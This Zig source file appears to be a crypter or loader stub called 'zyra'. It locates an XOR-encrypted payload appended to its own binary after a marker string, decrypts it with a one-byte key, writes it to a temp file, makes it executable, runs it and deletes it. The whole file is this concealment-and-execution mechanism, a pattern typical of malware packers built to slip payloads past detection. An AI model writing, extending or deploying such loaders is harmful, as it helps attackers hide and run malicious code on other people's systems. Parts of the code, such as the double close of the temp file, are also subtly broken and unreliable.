const std = @import("std");
const decryptor = @import("decryptor.zig");
const builtin = @import("builtin");

const PAYLOAD_START_MARKER = "PAYLOAD_START_MARKER";

pub fn main() !void {
    const allocator = std.heap.page_allocator;

    // Get the encrypted payload
    const payload_data = try getEmbeddedPayload(allocator);
    defer allocator.free(payload_data);

    // Decrypt the payload
    const key = payload_data[0];
    const encrypted_payload = payload_data[1..];
    const decrypted = try decryptor.xorDecrypt(allocator, encrypted_payload, key);
    defer allocator.free(decrypted);

    // Execute via tempfile (cross-platform)
    try executeViaTempfile(decrypted);
}

fn getEmbeddedPayload(allocator: std.mem.Allocator) ![]u8 {
    var self_path_buffer: [std.fs.MAX_PATH_BYTES]u8 = undefined;
    const self_path = try std.fs.selfExePath(&self_path_buffer);

    const file = try std.fs.openFileAbsolute(self_path, .{});
    defer file.close();
    const size = (try file.stat()).size;
    const n = std.math.cast(usize, size) orelse return error.FileTooLarge;
    const self_binary = try allocator.alloc(u8, n);
    defer allocator.free(self_binary);
    _ = try file.readAll(self_binary);

    if (std.mem.lastIndexOf(u8, self_binary, PAYLOAD_START_MARKER)) |marker_start| {
        const data_start = marker_start + PAYLOAD_START_MARKER.len;
        const size_bytes = self_binary[data_start .. data_start + 8];
        const payload_size = std.mem.readInt(u64, size_bytes[0..8], .little);

        const payload_start = data_start + 8;
        // +1 for the key byte
        const total_payload_size = payload_size + 1;
        const payload_len = std.math.cast(usize, total_payload_size) orelse return error.PayloadTooLarge;
        if (payload_start + payload_len > self_binary.len) return error.PayloadOutOfBounds;
        const payload = try allocator.alloc(u8, payload_len);
        @memcpy(payload, self_binary[payload_start .. payload_start + payload_len]);
        return payload;
    }
    return error.PayloadNotFound;
}

fn getTempDirPath(allocator: std.mem.Allocator) []const u8 {
    return std.process.getEnvVarOwned(allocator, "TMPDIR") catch std.process.getEnvVarOwned(allocator, "TEMP") catch std.process.getEnvVarOwned(allocator, "TMP") catch "/tmp";
}

fn executeViaTempfile(payload: []const u8) !void {
    const allocator = std.heap.page_allocator;
    const tmp_dir = getTempDirPath(allocator);
    defer if (!std.mem.eql(u8, tmp_dir, "/tmp")) allocator.free(tmp_dir);

    var temp_name_buffer: [256]u8 = undefined;
    const base_name = if (builtin.os.tag == .windows) "zyra_temp" else "zyra_temp";
    const temp_name = try std.fmt.bufPrint(&temp_name_buffer, "{s}/{s}_{}", .{ tmp_dir, base_name, std.time.timestamp() });

    const temp_file = try std.fs.createFileAbsolute(temp_name, .{ .read = true, .truncate = true });
    defer temp_file.close();
    defer std.fs.deleteFileAbsolute(temp_name) catch {};

    try temp_file.writeAll(payload);
    if (builtin.os.tag != .windows) {
        try temp_file.chmod(0o755);
    }
    temp_file.close();

    var argv = std.ArrayList([]const u8).init(allocator);
    defer argv.deinit();
    try argv.append(temp_name);

    var process = std.process.Child.init(argv.items, allocator);
    process.stdin_behavior = .Inherit;
    process.stdout_behavior = .Inherit;
    process.stderr_behavior = .Inherit;
    _ = try process.spawnAndWait();
}
